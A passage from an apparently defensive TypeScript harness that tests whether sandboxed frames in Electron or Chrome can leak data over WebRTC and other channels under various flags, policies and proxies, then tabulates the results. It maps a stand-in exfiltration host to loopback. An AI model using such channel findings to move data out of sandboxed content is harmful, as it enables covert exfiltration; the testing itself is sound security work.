    .join("+") || "none";

const frameKinds = values.desktop ? kinds : kinds.filter((k) => k !== "partition");
const plans: Plan[] = values.desktop
  ? [
      {
        config: "",
        switches: [],
        levers: [
          {},
          { csp: true },
          { policy: true },
          { preload: true },
          { proxy: true },
          { policy: true, proxy: true },
          { deadproxy: true },
          { policy: true, deadproxy: true },
          { policy: true, preload: true },
          { policy: true, preload: true, proxy: true },
        ],
        kinds: frameKinds,
        variants,
      },
      {
        config: "--force-webrtc-ip-handling-policy",
        switches: ["--force-webrtc-ip-handling-policy=disable_non_proxied_udp"],
        levers: [{}],
        kinds: ["sandboxed"],
        variants: ["direct"],
      },
      {
        config: "--webrtc-ip-handling-policy",
        switches: ["--webrtc-ip-handling-policy=disable_non_proxied_udp"],
        levers: [{}],
        kinds: ["sandboxed"],
        variants: ["direct"],
      },
      {
        // The command line fails every probe name; the rule the probe build
        // appends from code maps the TURN name to loopback. TURN by name
        // connecting means the appended rule is the one in force.
        config: "fence set from code",
        switches: [],
        rules: {
          line: "MAP * ~NOTFOUND, EXCLUDE localhost, EXCLUDE 127.0.0.1",
          appended:
            "MAP *.exfil.test 127.0.0.1, MAP * ~NOTFOUND, EXCLUDE localhost, EXCLUDE 127.0.0.1",
        },
        levers: [{}],
        kinds: ["sandboxed"],
        variants: ["direct"],
      },
      {
        config: "--enforce-webrtc-ip-permission-check",
        switches: ["--enforce-webrtc-ip-permission-check"],
        levers: [{}],
        kinds: ["sandboxed"],
        variants: ["direct"],
      },
    ]
  : [
      {
        config: "",
        switches: [],
        levers: [{}, { csp: true }, { preload: true }],
        kinds: frameKinds,
        variants,
      },
      {
        config: "pref",
        switches: [],
        policyPref: true,
        levers: [{ policy: true }, { policy: true, preload: true }],
        kinds: frameKinds,
        variants,
      },
      {
        config: "proxy",
        switches: [],
        proxied: true,
        levers: [{ proxy: true }],
        kinds: frameKinds,
        variants,
      },
      {
        config: "pref + proxy",
        switches: [],
        policyPref: true,
        proxied: true,
        levers: [{ policy: true, proxy: true }],
        kinds: frameKinds,
        variants,
      },
    ];

const engines: string[] = [];
for (const plan of plans) {
  const wanted = plan.levers.some((levers) =>
    plan.kinds.some((kind) =>
      plan.variants.some((variant) => {
        const config = [plan.config, label(levers)].filter((x) => x && x !== "none").join(" · ") || "none";
        return !only || only.test(`${config} ${kind} ${variant}`);
      }),
    ),
  );
  if (!wanted) continue;
  const engine = values.desktop
    ? await electron(out, plan.switches, plan.rules)
    : await chrome(plan.switches, plan.proxied ?? false, plan.policyPref ?? false);
  if (!engines.includes(engine.name)) engines.push(engine.name);
  console.log(`engine: ${engine.name}`);
  for (const levers of plan.levers)
    for (const kind of plan.kinds)
      for (const variant of plan.variants) {
        const config =
          [plan.config, label(levers)].filter((x) => x && x !== "none").join(" · ") || "none";
        if (only && !only.test(`${config} ${kind} ${variant}`)) continue;
        await measure(engine, config, levers, kind, variant);
      }
  await engine.close();
}

host.close();
appServer.close();
proxy.close();

// ---- The table ----

const md: string[] = [];
md.push(`Engines: ${engines.join("; ")}`, "");
md.push(
  `Permissions-Policy features with "rtc" or "peer" in the name: ${JSON.stringify((featuresSeen ?? []).filter((f) => /rtc|peer/i.test(f)))} (of ${featuresSeen?.length ?? "?"})`,
  "",
);
md.push(`| levers | frame | variant | API | ${channels.join(" | ")} | own fetch | bridge |`);
md.push(`|${" --- |".repeat(4 + channels.length + 2)}`);
for (const row of rows)
  md.push(
    `| ${row.config} | ${row.kind} | ${row.variant} | ${row.api} | ${channels.map((c) => row.cells[c]).join(" | ")} | ${row.own} | ${row.bridge} |`,
  );
const errorsSeen = [...new Set(rows.flatMap((row) => row.errors))];
md.push("", "Errors the probes reported:", ...errorsSeen.map((e) => `- ${e}`));
md.push(
  "",
  `Permissions asked: ${JSON.stringify([...new Set(rows.flatMap((r) => r.permissions))])}`,
);
md.push(
  "",
  `Proxy refusals (sample): ${JSON.stringify([...new Set(refused.map((r) => r.replace(/:\d+$/, ":<port>")))])}`,
);
const name = values.desktop ? "electron" : "chrome";
writeFileSync(join(out, `${name}.md`), md.join("\n"));
writeFileSync(join(out, `${name}.json`), JSON.stringify(rows, null, 1));
console.log(md.join("\n"));
console.log(`results in ${out}`);
process.exit(0);
